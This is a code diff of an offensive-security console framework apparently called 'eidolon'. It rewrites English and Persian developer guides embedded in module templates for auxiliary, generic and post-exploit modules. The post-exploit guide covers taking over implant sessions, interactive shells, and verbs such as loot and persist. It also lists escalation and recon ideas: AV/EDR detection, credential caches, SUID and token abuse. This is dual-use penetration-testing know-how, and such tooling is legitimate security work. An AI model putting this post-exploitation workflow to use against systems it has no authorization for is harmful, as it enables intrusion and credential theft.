+     پوشه‌ی کاری اپراتور — هیچ چیز به انبار موقت نمی‌رود)؛ وگرنه سطرها
+     روی کنسول چاپ می‌شوند. خروجی ماشینی (json/csv) از حدسِ قشنگ بهتر است.
+  ۵. (اختیاری) هویت مشورتی: RANK / TARGETS / REFERENCES — با `info` نمایش،
+     هرگز اجرایی نیستند.
 
-اعتماد (TOFU): ماژول تازه UNTRUSTED است؛ جریان:
-      trust <name> ← use <name> ← set کلید مقدار ← run
-  اولین run ثبت می‌شود؛ ویرایشِ بعد از آن = "modified" تا re-trust.
+بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
+      new_module myaux auxiliary ؛ trust myaux ؛ use myaux
+      set target 10.4.2.0/24 ؛ run        <- بازرسی منفعل
+      set active true ؛ run               <- پراب‌های فعال روشن
+      set output recon-vpn.json ؛ run     <- گزارش کنار اپراتور می‌نشیند
+  auxiliary اعمالِ ساده است: فقط وقتی `run` بلوک کند job می‌شود (`jobs` /
+  `kill <id>`)، درست مثل بقیه‌ی تایپ‌ها.
 
-قلاب‌های چرخه (همه اختیاری):
-  on_load()  یک بار در لود — فقط ارزان و بی‌خطر.
-  stop()     توقف تمیز ماژول‌های طولانی‌مدت؛ `kill <id>` صدا می‌زند.
-
-شیوه‌ی خانه:
-  * با اپراتور فقط از eidolon.utils حرف بزن (ok/err/info/warn/spectral).
-  * شبکه: همیشه timeout صریح؛ گزارش خطا با err(str(err)).
-  * فایل‌سیستم: وایت‌لیست + مهار realpath؛ هرگز eval/exec.
-  * آرتیفکت حاوی کلید واقعی: با 0o600 نوشته شود.
-
-auxiliary = پژوهش و پشتیبانی. مستقیم حمله نمی‌کند. کل طیف باز است: اسکن پورت،
-اثر انگشت سرویس، OSINT، ریکان DNS، فازر، اسنیفر، هارنس brute-force، پارسر،
-گزارش‌نویس — هرچه لایه‌ی اکسپلویت را باهوش‌تر کند.
+بخش ۵ — چک‌لیست پیش از اعلام «تمام»
+  [ ] پیش‌فرض منفعل، فعال‌شدن با رضایت صریح
+  [ ] هر پراب timeout صریح و هم‌زمانی محدود دارد
+  [ ] یافته‌ها مقدار ساده‌اند؛ مسیر گزارش = پوشه‌ی کاری اپراتور (هرگز tmp)
+  [ ] خطا یک میزبان را می‌پراند، جارو را نمی‌کشد
+  [ ] قالب خروجی در توضیح OPTIONS مستند است
 """
 
 from eidolon.utils import ok, err, info, warn, spectral
@@ -982,7 +1285,6 @@ TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
 PAYLOAD_KIND = "none"
-REQUIREMENTS = []
 
 OPTIONS = {
     "target": {"value": "", "required": True,
@@ -1020,42 +1322,61 @@ def run(opts):
 ''',
     },
     "generic": {
-        "en": '''"""
-__NAME__ — GENERIC module — developer field guide
-THE CONTRACT — the framework requires exactly two names:
-  * OPTIONS   : {KEY: {"value": default, "required": bool, "desc": str}}
-                `set KEY value` fills these; required keys are validated
-                automatically BEFORE run() fires. Extra keys: "kind"
-                ("payload" = framework-managed field) and "types".
-  * run(opts) : receives {KEY: value}. Everything else optional.
+        "en": r'''"""
+__NAME__ — GENERIC module — the complete zero-to-100 developer guide
+=====================================================================
 
-INJECTED BY THE FRAMEWORK (inside run, zero setup):
+WHAT A GENERIC MODULE IS HERE
+  GENERIC = neither attack nor investigation: encoders/decoders,
+  converters, packagers, report generators, payload transformers (any
+  language in -> anything out), automation glue. When it is not exploit,
+  listener, payload or auxiliary — it lives here.
+
+PART 1 — THE CONTRACT (the framework requires exactly two names)
+  * OPTIONS  : {KEY: {"value": default, "required": bool, "desc": str}}
+               `set KEY value` fills them; required keys validated
+               automatically BEFORE run() fires.
+  * run(opts): receives {KEY: value}; plain def or async def.
+  Optional hooks: on_load() / stop() — like every module.
+
+PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
   opts              {KEY: value} — resolved option values
-  EIDOLON_GLOBALS   shared global dict — setg/globals; persist small state
+  EIDOLON_GLOBALS   shared global dict — persist small state
   EIDOLON_SHELL     the live console instance (internal API — sparingly)
   __eidolon_path__  absolute path of this file (resolve siblings from it)
 
-DEPENDENCIES: pip names in REQUIREMENTS — DISPLAYED (`deps`), NEVER installed
-  (supply-chain safety). The operator runs:  pip install <name>
+PART 3 — WRITING A GENERIC MODULE FROM ZERO (the exact recipe)
+  1. One sharp responsibility per module: convert X to Y, package Z,
+     generate report R. Composability beats cleverness — modules call
+     each other by reading shared state through EIDOLON_GLOBALS.
+  2. Declare OPTIONS: `input` (required — file, string, whatever your
+     transform eats) and `output` (empty = print to console). Add knobs
+     (mode, level, target language ...) as the tool needs.
+  3. Implement run(opts):
+       - read the input ONLY through the way the operator chose (path /
+         string) — never invent locations, never touch temp storage;
+       - output-path default is the operator's cwd (os.getcwd()) when you
+         write artifacts; relative paths stay relative to that;
+       - subprocess tools (compilers/encoders) always with a timeout and
+         captured stderr; failures -> err(str(e)).
+  4. Keep outputs inspectable: print a one-line summary via ok()/info();
+     write the full result to `output` when set. Machine formats over
+     prose.
+  5. (optional) Advisory identity: RANK / TARGETS / REFERENCES.
 
-TRUST (TOFU): fresh modules start UNTRUSTED:
-      trust <name> → use <name> → set KEY value → run
-  First run is recorded; later edits flip it to "modified" until re-trust.
+PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
+      new_module myconv generic ; trust myconv ; use myconv
+      set input dump.bin ; run            -> console result
+      set output converted.txt ; run      -> result beside the operator
+  As everywhere: transformation tooling runs in the foreground; wrap your
+  own long loops in a thread and let `run` job out if needed
+  (`jobs` / `kill <id>`).
 
-LIFECYCLE HOOKS (optional):
-  on_load()  once at load — cheap + safe only.
-  stop()     long-running modules: clean halt (sockets/loops). `kill <id>`
-             calls it; no stop() = cannot be killed.
-
-HOUSE STYLE:
-  * speak to the operator only via eidolon.utils (ok/err/info/warn/spectral).
-  * network: explicit timeout always; report str(err) through err().
-  * filesystem: whitelists + realpath containment; never eval/exec.
-  * artifacts with real keys are written 0o600.
-
-GENERIC = neither attack nor investigation: encoders/decoders, converters,
-packagers, report generators, payload transformers (any language in →
-anything out), automation glue.
+PART 5 — CHECKLIST BEFORE YOU CALL IT DONE
+  [ ] single sharp responsibility; composable via EIDOLON_GLOBALS
+  [ ] input only from OPTIONS-given paths; no temp staging
+  [ ] outputs default to the operator's cwd
+  [ ] every subprocess has a timeout; stderr reported through err()
 """
 
 from eidolon.utils import ok, err, info, warn, spectral
@@ -1072,7 +1393,6 @@ TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
 PAYLOAD_KIND = "none"
-REQUIREMENTS = []
 
 OPTIONS = {
     "input":  {"value": "", "required": True,  "desc": "input (file, string …)"},
@@ -1095,40 +1415,58 @@ def run(opts):
     else:
         ok(f"result: {result}")
 ''',
-        "fa": '''"""
-__NAME__ — GENERIC module — developer field guide
-قرارداد — فریم‌ورک فقط دو اسم را لازم دارد:
-  * OPTIONS   : {کلید: {"value": پیش‌فرض, "required": بول, "desc": توضیح}}
-                `set کلید مقدار` این‌ها را پر می‌کند؛ کلیدهای required پیش از
-                run() خودکار اعتبارسنجی می‌شوند. کلیدهای اضافی: "kind"
-                ("payload" = فیلد اختصاصیِ مدیریت‌شده) و "types".
-  * run(opts) : مقدار {کلید: مقدار} می‌گیرد؛ بقیه اختیاری.
+        "fa": r'''"""
+__NAME__ — ماژول GENERIC — راهنمای کامل صفر تا صد توسعه‌دهنده
+=====================================================================
 
-توسط فریم‌ورک تزریق می‌شود (داخل run، بدون تنظیم):
-  opts              {کلید: مقدار} — مقادیر گزینه‌ها
-  EIDOLON_GLOBALS   دیکشنری سراسری مشترک — setg/globals
+generic در اینجا یعنی چه
+  GENERIC = نه حمله، نه پژوهش: انکودر/دیکودر، مبدل، بسته‌بند، گزارش‌ساز،
+  ترنسفورمر پیلود (هر زبانی در <- هر چیزی بیرون)، چسب اتوماسیون. وقتی نه
+  exploit است نه listener نه payload نه auxiliary — خانه‌اش همین‌جاست.
+
+بخش ۱ — قرارداد (فریم‌ورک فقط دو نام لازم دارد)
+  * OPTIONS  : {کلیدی: {"value": پیشفرض, "required": بول, "desc": توضیح}}
+               با `set کلید مقدار` پر می‌شوند؛ کلیدهای required قبل از
+               اجرای run() خودکار کنترل می‌شوند.
+  * run(opts): {کلیدی: مقدار} می‌گیرد؛ def ساده یا async def.
+  قلاب‌های اختیاری: on_load() / stop() — مثل همه‌ی ماژول‌ها.
+
+بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
+  opts              {کلید: مقدار} — مقادیر حل‌شده‌ی گزینه‌ها
+  EIDOLON_GLOBALS   دیکشنری سراسری مشترک — نگهداری حالت کوچک
   EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول (API داخلی — کم و حساب‌شده)
-  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از این حل کن)
+  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از روی آن حل کن)
 
-وابستگی‌ها: اسم‌های pip در REQUIREMENTS — فقط «نمایش» (`deps`)، هرگز نصب
-  خودکار (امنیت زنجیره‌ی تأمین). اپراتور خودش:  pip install <name>
+بخش ۳ — نوشتن ماژول generic از صفر، گام به گام
+  ۱. هر ماژول یک مسئولیت تیز: تبدیل X به Y، بسته‌بندی Z، تولید گزارش R.
+     ترکیب‌پذیری مهم‌تر از هوشمندی است — ماژول‌ها با خواندن حالت مشترک از
+     EIDOLON_GLOBALS هم را صدا می‌زنند.
+  ۲. OPTIONS را اعلام کن: `input` (لازم — فایل، رشته، هر چه ترنسفورمت
+     می‌خورَد) و `output` (خالی = چاپ در کنسول). پیچ‌های دیگر (mode،
+     سطح، زبان هدف …) طبق نیاز ابزار اضافه کن.
+  ۳. پیاده‌سازی run(opts):
+       - ورودی فقط از راهی که اپراتور داده خوانده شود (مسیر/رشته) — هرگز
+         آدرس از خودت نساز، هرگز انبار موقت را لمس نکن؛
+       - پیش‌فرض مسیر خروجی پوشه‌ی کاری اپراتور است (os.getcwd()) وقتی
+         آرتیفکت می‌نویسی؛ مسیر نسبی نسبت به همان می‌ماند؛
+       - ابزارهای subprocess (کامپایلر/انکودر) همیشه با timeout و stderr
+         گرفته‌شده؛ شکست <- err(str(e)).
+  ۴. خروجی قابل بازرسی نگه دار: یک خط خلاصه با ok()/info()؛ نتیجه‌ی کامل
+     در `output` وقتی ست است. فرمت ماشینی بهتر از نثر است.
+  ۵. (اختیاری) هویت مشورتی: RANK / TARGETS / REFERENCES.
 
-اعتماد (TOFU): ماژول تازه UNTRUSTED است؛ جریان:
-      trust <name> ← use <name> ← set کلید مقدار ← run
-  اولین run ثبت می‌شود؛ ویرایشِ بعد از آن = "modified" تا re-trust.
+بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
+      new_module myconv generic ؛ trust myconv ؛ use myconv
+      set input dump.bin ؛ run            <- نتیجه روی کنسول
+      set output converted.txt ؛ run      <- نتیجه کنار اپراتور
+  مثل همه‌جا: ابزارِ تبدیل پیش‌زمینه اجرا می‌شود؛ حلقه‌های بلند خودت را در
+  thread بپیچ و در صورت نیاز `run` را job کن (`jobs` / `kill <id>`).
 
-قلاب‌های چرخه (همه اختیاری):
-  on_load()  یک بار در لود — فقط ارزان و بی‌خطر.
-  stop()     توقف تمیز ماژول‌های طولانی‌مدت؛ `kill <id>` صدا می‌زند.
-
-شیوه‌ی خانه:
-  * با اپراتور فقط از eidolon.utils حرف بزن (ok/err/info/warn/spectral).
-  * شبکه: همیشه timeout صریح؛ گزارش خطا با err(str(err)).
-  * فایل‌سیستم: وایت‌لیست + مهار realpath؛ هرگز eval/exec.
-  * آرتیفکت حاوی کلید واقعی: با 0o600 نوشته شود.
-
-generic = نه حمله، نه پژوهش: انکودر/دیکودر، تبدیل‌کننده، پکیجر، تولیدکننده
-گزارش، ترنسفورمر پی‌لود (هر زبان در ← هرچیز بیرون)، چسب اتوماسیون.
+بخش ۵ — چک‌لیست پیش از اعلام «تمام»
+  [ ] یک مسئولیت تیز؛ ترکیب‌پذیر از راه EIDOLON_GLOBALS
+  [ ] ورودی فقط از مسیرهای اعلام‌شده در OPTIONS؛ بدون stage در tmp
+  [ ] خروجی‌ها پیش‌فرض پوشه‌ی کاری اپراتور
+  [ ] هر subprocess timeout دارد؛ stderr با err() گزارش می‌شود
 """
 
 from eidolon.utils import ok, err, info, warn, spectral
@@ -1145,7 +1483,6 @@ TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
 PAYLOAD_KIND = "none"
-REQUIREMENTS = []
 
 OPTIONS = {
     "input":  {"value": "", "required": True,  "desc": "input (file, string …)"},
@@ -1171,46 +1508,85 @@ def run(opts):
     },
     "post-exploit": {
         "en": r'''"""
-__NAME__ — POST-EXPLOIT — full recon + escalation after initial access
+__NAME__ — POST-EXPLOIT — the complete zero-to-100 developer guide
+===================================================================
 
-POSITION IN THE CHAIN: an exploit gets you IN; THIS module owns everything
-after. It REQUIRES initial access — declare how you hold the foothold (a
-wraith session, a listener channel, an agent id…) in OPTIONS, then:
-  * run(opts)   : full situational recon and/or privilege escalation.
-  * shell(opts) : hand the operator the interactive shell channel.
-The SHELL IS NEGOTIATED, never imposed: raw bash, cmd, PowerShell, or any
-verb protocol your listener and implant agree on. def AND async def are
-both first-class for run() and shell() — the framework runs the event loop
-for you (foreground or as a job).
+POSITION IN THE CHAIN
+  An exploit gets you IN; THIS module owns everything after. It REQUIRES
+  initial access — declare how you hold the foothold (a wraith session, a
+  listener channel, an agent id...) in OPTIONS, then do the two jobs:
+  full recon, escalation, and an interactive shell channel.
 
-THE CONTRACT (three names):
+PART 1 — THE CONTRACT (THREE names, one more than every other type)
   * OPTIONS    : same {"KEY": {"value", "required", "desc"}} page as every
                  module; required keys validated BEFORE run()/shell().
-  * run(opts)  : the post-exploit work phase. sync or async def.
-  * shell(opts): interactive takeover — invoked by the operator's `shell`
-                 command while this module is selected. sync or async def.
+                 The natural option here is `session` (which foothold).
+  * run(opts)  : PHASE 1 — recon / escalation through the foothold.
+                 plain def or async def.
+  * shell(opts): PHASE 2 — interactive takeover; invoked by the operator's
+                 `shell` command while this module is selected. Works even
+                 BEFORE run() — locate the foothold yourself.
+  Both run() and shell(): def AND async def are first-class — the
+  framework runs the event loop for you (foreground or as a job).
+  Optional hooks: on_load() / stop() like every module.
 
-INJECTED INSIDE run()/shell(): opts · EIDOLON_GLOBALS · EIDOLON_SHELL ·
-__eidolon_path__.
+PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run()/shell() (zero setup)
+  opts              {KEY: value} — resolved option values
+  EIDOLON_GLOBALS   shared global dict — persist small state
+  EIDOLON_SHELL     the live console instance
+  __eidolon_path__  absolute path of this file (resolve siblings from it)
 
-GETTING THE SHELL FROM A LISTENER (three moves, shown below):
-  1 FOOTHOLD — eidolon.wraith.sessions.default_registry() holds the sessions
-    your exploits produced (`c2 sessions` lists them).
-  2 DIALECT — the payload you built already speaks a shell dialect YOU chose
-    at build time (raw bash, cmd, …). A session's interact() IS that
-    negotiated channel: calling it hands the console to the listener's shell.
-  3 TAKEOVER — or keep the console in-module with
-    sh.enter_subshell(handler, completer=fn, prompt_fn=fn, on_exit=fn):
-    the completer gives FULL TAB COMPLETION over the verbs you agreed on.
+PART 3 — WRITING A POST-EXPLOIT FROM ZERO: THE THREE MOVES
+  MOVE 1 — FOOTHOLD (initial access is REQUIRED in this type).
+      eidolon.wraith.sessions.default_registry() holds the sessions your
+      exploits produced (`c2 sessions` lists them). Pick by explicit
+      `session` option or the first active session (shown in the code):
+          def _pick_session(opts):
+              from eidolon.wraith import sessions as ws
+              reg = ws.default_registry()
+              sid = str(opts.get("session", "")).strip()
+              if sid: return reg.find(sid)          # raises with a clear message
+              pool = [s for s in reg.all() if s.status == "active"]
+              return pool[0] if pool else None
+      No active session -> err("break in first (`c2 sessions`)") — never
+      invent a foothold.
+  MOVE 2 — DIALECT
+      The payload you built speaks a shell dialect YOU chose at build time
+      (raw bash / cmd / PowerShell / any verb protocol). A session's
+      interact IS that negotiated channel: calling sess.interact(sh) hands
+      the console straight to the listener's shell. Keep zero assumptions:
+      what `dir` means, how outputs are framed — all agreed between you
+      and the implant.
+  MOVE 3 — TAKEOVER (the interactive shell)
+      Either delegate to the session channel (sess.interact) or keep the
+      console in-module with:
+          sh.enter_subshell(on_line=fn, completer=fn,      # FULL TAB COMPLETION
+                            prompt_fn=fn, on_exit=fn)
+      The completer enumerates the verbs WE agreed on (sysinfo / whoami /
+      loot / persist / upgrade / back / exit — below).
 
-ADVISORY metadata (like every module): RANK / TARGETS / REFERENCES —
-quality grade, what the technique applies to, advisories. `info` displays
-them; the framework never enforces them.
+PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
+      new_module mypost post-exploit ; trust mypost
+      (... exploit lands a session: c2 sessions shows sid ...)
+      use mypost                        -> select the post-exploit module
+      run                               -> PHASE 1 recon/escalation readout
+      shell                             -> PHASE 2 takeover (module channel)
+      back / exit                       -> console; channel stays live
+  Recon ideas to implement: OS/kernel build, services, AV/EDR presence,
+  credential caches, scheduled tasks, containers, lateral reachability.
+  Escalation ideas: SUID/capabilities, token abuse, service misconfig,
+  kernel bugs — the framework judges nothing.
 
-RECON IDEAS (yours to implement): OS/kernel build, running services,
-AV/EDR presence, credential caches, scheduled tasks, containers,
-lateral reachability. ESCALATION IDEAS: SUID/capabilities, token abuse,
-service misconfig, kernel bugs — the framework judges nothing.
+PART 5 — SAFETY/HOUSE RULES
+  * speak to the operator only via eidolon.utils (ok/err/info/warn).
+  * every network op has an explicit timeout; errors via err(str(e)).
+  * no eval/exec; artifacts 0o600; nothing in temp storage.
+
+PART 6 — CHECKLIST BEFORE YOU CALL IT DONE
+  [ ] refuses cleanly with no active session (err, never a traceback)
+  [ ] `session` option resolves any sid prefix; default = first active
+  [ ] shell() works before AND after run()
+  [ ] tab completion lists the real verbs agreed with the implant
 """
 
 import os
@@ -1228,7 +1604,6 @@ RANK        = "normal"      # quality grade: excellent > great > good > normal >
 TARGETS     = []            # what this applies to: ("linux/x86_64", "ubuntu 22.04"), net ranges
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
-REQUIREMENTS = []
 
 OPTIONS = {
     "session": {"value": "", "required": False,
@@ -1286,46 +1661,83 @@ def shell(opts):
                       on_exit=lambda: info("back to eidolon — channel stays live"))
 ''',
         "fa": r'''"""
-__NAME__ — POST-EXPLOIT — جمع‌آوری کامل اطلاعات و ارتقای دسترسی بعد از ورود
+__NAME__ — ماژول POST-EXPLOIT — راهنمای کامل صفر تا صد توسعه‌دهنده
+===================================================================
 
-جایگاه در زنجیره: اکسپلویت فقط «ورود» می‌دهد؛ «این ماژول» صاحبِ همه‌ی چیزهای
-بعد از ورود است. این ماژول به دسترسی اولیه نیاز دارد — نحوه‌ی اتصال به نفوذ
-را در OPTIONS مشخص کن (یک سشن wraith، یک کانال لیسنر، شناسه‌ی agent…):
-  * run(opts)   : جمع‌آوری کامل اطلاعات و/یا ارتقای دسترسی.
-  * shell(opts) : تحویل کانال شل تعاملی به اپراتور.
-شلِ «توافقی» است و هیچ‌وقت تحمیلی نیست: raw bash، cmd، PowerShell یا هر
-پروتکل دستوری که لیسنر و ایمپلنت توافق کرده‌اند. def و async def برای run()
-و shell() هر دو درجه‌یک‌اند — فریم‌ورک حلقه‌ی رویداد را خودش اجرا می‌کند
-(foreground یا به‌صورت job).
+جایگاه در زنجیره
+  اکسپلویت «ورود» می‌دهد؛ «این ماژول» صاحب همه‌ی چیزهای بعد از ورود است.
+  به دسترسی اولیه نیاز دارد — نحوه‌ی اتصال به نقطه‌ی نفوذ را در OPTIONS
+  مشخص کن (یک سشن wraith، یک کانال لیستنر، شناسه‌ی agent …)، سپس دو کار:
+  ریکون کامل، ارتقای دسترسی، و کانال شل تعاملی.
 
-قرارداد (سه اسم):
-  * OPTIONS    : همان صفحه‌ی {"کلید": {"value", "required", "desc"}} همه‌ی ماژول‌ها؛
-                 کلیدهای required قبل از run()/shell() اعتبارسنجی می‌شوند.
-  * run(opts)  : فاز کار post-exploit. sync یا async def.
-  * shell(opts): تصاحب تعاملی — با دستور `shell` اپراتور صدا زده می‌شود.
-                 sync یا async def.
+بخش ۱ — قرارداد (سه نام — یکی بیشتر از هر تایپ دیگر)
+  * OPTIONS    : همان صفحه‌ی {"کلید": {"value", "required", "desc"}} همه‌ی
+                 ماژول‌ها؛ کلیدهای required قبل از run()/shell() کنترل
+                 می‌شوند. گزینه‌ی طبیعی اینجا `session` است (کدام فوهولد).
+  * run(opts)  : فاز ۱ — ریکون / ارتقا از طریق فوهولد. def ساده یا async.
+  * shell(opts): فاز ۲ — تصاحب تعاملی؛ با دستور `shell` اپراتور در حال
+                 انتخاب این ماژول صدا زده می‌شود. حتی قبل از run() هم
+                 کار می‌کند — فوهولد را خودت پیدا کن.
+  برای run() و shell() هر دو: def و async def درجه‌یک‌اند — فریم‌ورک حلقه‌ی
+  رویداد را خودش اجرا می‌کند (پیش‌زمینه یا به‌صورت job).
+  قلاب‌های اختیاری: on_load() / stop() مثل همه‌ی ماژول‌ها.
 
-داخل run()/shell() تزریق می‌شود: opts · EIDOLON_GLOBALS · EIDOLON_SHELL ·
-__eidolon_path__.
+بخش ۲ — فریم‌ورک داخل run()/shell() چه چیزهایی تزریق می‌کند (بدون تنظیم)
+  opts              {کلید: مقدار} — مقادیر حل‌شده
+  EIDOLON_GLOBALS   دیکشنری سراسری مشترک
+  EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول
+  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از روی آن حل کن)
 
-گرفتن شل از لیسنر (سه حرکت، در زیر):
-  1 فوهولد — eidolon.wraith.sessions.default_registry() سشن‌هایی را دارد که
-    اکسپلویت‌های تو ساخته‌اند (`c2 sessions` لیستشان می‌کند).
-  2 لهجه — پی‌لودی که ساختی از لحظه‌ی بیلد یک لهجه‌ی شل «انتخابِ خودت» را
-    حرف می‌زند (raw bash، cmd، …). interact() هر سشن همان کانال توافقی است:
-    صدازدنش کنسول را به شلِ لیسنر می‌سپارد.
-  3 تصاحب — یا کنسول را داخل ماژول نگه دار با
-    sh.enter_subshell(handler, completer=fn, prompt_fn=fn, on_exit=fn):
-    completer تَب‌کامپلیت کامل برای فعل‌هایی می‌دهد که توافق کرده‌اید.
+بخش ۳ — نوشتن post-exploit از صفر: سه حرکت
+  حرکت ۱ — فوهولد (دسترسی اولیه در این تایپ «اجباری» است).
+      eidolon.wraith.sessions.default_registry() سشن‌هایی را دارد که
+      اکسپلویت‌های تو ساخته‌اند (`c2 sessions` فهرستشان می‌کند). انتخاب با
+      گزینه‌ی صریح `session` یا اولین سشن فعال (در کد پایین آمده):
+          def _pick_session(opts):
+              from eidolon.wraith import sessions as ws
+              reg = ws.default_registry()
+              sid = str(opts.get("session", "")).strip()
+              if sid: return reg.find(sid)          # خطای شفاف می‌دهد
+              pool = [s for s in reg.all() if s.status == "active"]
+              return pool[0] if pool else None
+      سشن فعال نیست <- err("اول نفوذ کن (`c2 sessions`)") — هرگز فوهولد
+      از خودت نیساز.
+  حرکت ۲ — لهجه
+      پیلودی که ساختی لهجه‌ی شلی می‌زند که «تو» در زمانِ ساختن انتخاب
+      کردی (raw bash / cmd / PowerShell / هر پروتکل فعلی). interact سشن
+      همان کانال توافقی است: صدا زدن sess.interact(sh) کنسول را مستقیم
+      به شل لیستنر می‌سپارد. صفر فرض: یعنی `dir` چه معنایی دارد، خروجی‌ها
+      چطور قالب‌بندی می‌شوند — همه توافق تو و ایمپلنت است.
+  حرکت ۳ — تصاحب (شل تعاملی)
+      یا کانال سشن را واگذار کن (sess.interact) یا کنسول را داخل ماژول
+      نگه دار با:
+          sh.enter_subshell(on_line=fn, completer=fn,      # تب‌کامپلیت کامل
+                            prompt_fn=fn, on_exit=fn)
+      کامپلیتر فعل‌هایی را که «ما» توافق کردیم بر‌می‌شمارد (sysinfo /
+      whoami / loot / persist / upgrade / back / exit — پایین).
 
-متادیتای مشورتی (مثل همه‌ی ماژول‌ها): RANK / TARGETS / REFERENCES —
-مرتبه‌ی کیفیت، اعتبار روی چه چیزی، ارجاع‌ها. `info` نمایش می‌دهد؛
-فریم‌ورک هرگز اجباری نمی‌کند.
+بخش ۴ — جریان اپراتور (صفر تا صد، هر گام کنسولی)
+      new_module mypost post-exploit ؛ trust mypost
+      (... اکسپلویت سشن می‌اندازد: c2 sessions نشان می‌دهد sid ...)
+      use mypost                        <- انتخاب ماژولِ post-exploit
+      run                               <- فاز ۱ خروجی ریکون/ارتقا
+      shell                             <- فاز ۲ تصاحب (کانال ماژول)
+      back / exit                       <- کنسول؛ کانال زنده می‌ماند
+  ایده‌های ریکون برای پیاده‌سازی: نسخه‌ی OS/کرنل، سرویس‌ها، حضور AV/EDR،
+  کش اعتبارنامه‌ها، تسک‌های زمان‌بندی‌شده، کانتینرها، دسترس‌پذیری جانبی.
+  ایده‌های ارتقا: SUID/capabilities، سوءاستفاده از token، پیکربندی غلط
+  سرویس، باگ کرنل — فریم‌ورک داوری نمی‌کند.
 
-ایده‌های RECON (پیاده‌سازی با خودت): نسخه‌ی OS/کرنل، سرویس‌های در حال اجرا،
-وجود AV/EDR، کشِ اعتبارنامه‌ها، تسک‌های زمان‌بندی‌شده، کانتینرها،
-دسترس‌پذیری جانِبی. ایده‌های ارتقای دسترسی: SUID/capabilities،
-سوءاستفاده از token، پیکربندی غلط سرویس، باگ کرنل — فریم‌ورک داوری نمی‌کند.
+بخش ۵ — قوانین ایمنی/خانه
+  * با اپراتور فقط از eidolon.utils حرف بزن (ok/err/info/warn).
+  * هر عملیات شبکه timeout صریح دارد؛ خطا با err(str(e)).
+  * eval/exec ممنوع؛ آرتیفکت 0o600؛ هیچ چیز در انبار موقت.
+
+بخش ۶ — چک‌لیست پیش از اعلام «تمام»
+  [ ] بدون سشن فعال با err تمیز رد می‌شود (هرگز traceback)
+  [ ] گزینه‌ی `session` هر پیشوند sid را حل می‌کند؛ پیش‌فرض = اولین فعال
+  [ ] shell() قبل و بعد از run() کار می‌کند
+  [ ] تب‌کامپلیت فعل‌های واقعیِ توافق‌شده با ایمپلنت را فهرست می‌کند
 """
 
 import os
@@ -1343,7 +1755,6 @@ RANK        = "normal"      # مرتبه‌ی کیفیت: excellent > great > go
 TARGETS     = []            # اعتبار روی چه: ("linux/x86_64", "ubuntu 22.04")، بره‌ها
 REFERENCES  = []            # ارجاع‌ها: CVE، ورایت‌آپ، یادداشت توسعه‌دهنده
 
-REQUIREMENTS = []
 
 OPTIONS = {
     "session": {"value": "", "required": False,
@@ -1402,22 +1813,9 @@ def shell(opts):
 ''',
     },
 }
-
-
 def _type_label(mod) -> str:
     t = _module_type(mod)
     return c(t, _TYPE_COLOR.get(t, "white"))
-
-
-def _missing_requirements(reqs) -> list:
-    missing = []
-    for r in reqs:
-        try:
-            if importlib.util.find_spec(str(r)) is None:
-                missing.append(str(r))
-        except (ImportError, ValueError):
-            missing.append(str(r))
-    return missing
 
 
 class Eidolon(cmd.Cmd):
@@ -2123,7 +2521,8 @@ class Eidolon(cmd.Cmd):
     # ═══════════════════════════════════════════════════════════════════
     def do_new_module(self, arg):
         """new_module <name> [dir] [--fa] [type] — scaffold a fully documented
-        module skeleton; type: exploit|listener|payload|post-exploit|auxiliary|generic
+        module skeleton with a zero-to-100 developer guide embedded in the
+        docstring; type: exploit|listener|payload|post-exploit|auxiliary|generic
         (--fa = complete Persian field documentation; default English)"""
         types_map = {
             "exploit": "exploit", "listener": "listener", "server": "listener",
@@ -2271,7 +2670,6 @@ class Eidolon(cmd.Cmd):
         print(f"  {C.CYAN}help{C.RESET} / {C.CYAN}clear{C.RESET} / {C.CYAN}banner{C.RESET} / {C.CYAN}reload{C.RESET} / {C.CYAN}exit{C.RESET}")
         print(f"  {C.CYAN}modules{C.RESET} / {C.CYAN}ls{C.RESET} [--all] / {C.CYAN}search{C.RESET} <kw> / {C.CYAN}info{C.RESET} <name>")
         print(f"  {C.CYAN}use{C.RESET} <name> / {C.CYAN}back{C.RESET} / {C.CYAN}options{C.RESET} / {C.CYAN}set{C.RESET} <k> <v> / {C.CYAN}run{C.RESET}")
-        print(f"  {C.CYAN}deps{C.RESET} <name> — show module pip requirements (never auto-installed)")
         print(f"  {C.PINK}── TOFU ──{C.RESET}")
         print(f"  {C.CYAN}trust{C.RESET} <module>|--all    · {C.CYAN}untrust{C.RESET} <module>")
         print(f"  {C.CYAN}trusted{C.RESET} [--all]          · {C.CYAN}verify{C.RESET}")
@@ -2435,12 +2833,6 @@ class Eidolon(cmd.Cmd):
         if opts:
             rows = [[k, str(v.get("value", "")), "yes" if v.get("required") else "no", v.get("kind", ""), v.get("desc", "")] for k, v in opts.items()]
             print_table(["Name", "Default", "Req", "Kind", "Desc"], rows, title="OPTIONS")
-        reqs = [str(r) for r in (getattr(m, "REQUIREMENTS", None) or [])]
-        if reqs:
-            missing = _missing_requirements(reqs)
-            shown = ", ".join(f"{C.RED}{r}{C.RESET}" if r in missing else r for r in reqs)
-            print(f"  {C.PURPLE}│{C.RESET} reqs : {shown}")
-            warn(f"requirements are NOT auto-installed — see: {C.PINK}deps {name}{C.RESET}")
         print()
 
     def do_use(self, arg):
@@ -2462,10 +2854,6 @@ class Eidolon(cmd.Cmd):
         self.current_name = name
         self.current_options = copy.deepcopy(getattr(mod, "OPTIONS", {}))
         ok(f"selected: {c(name, C.PINK)}")
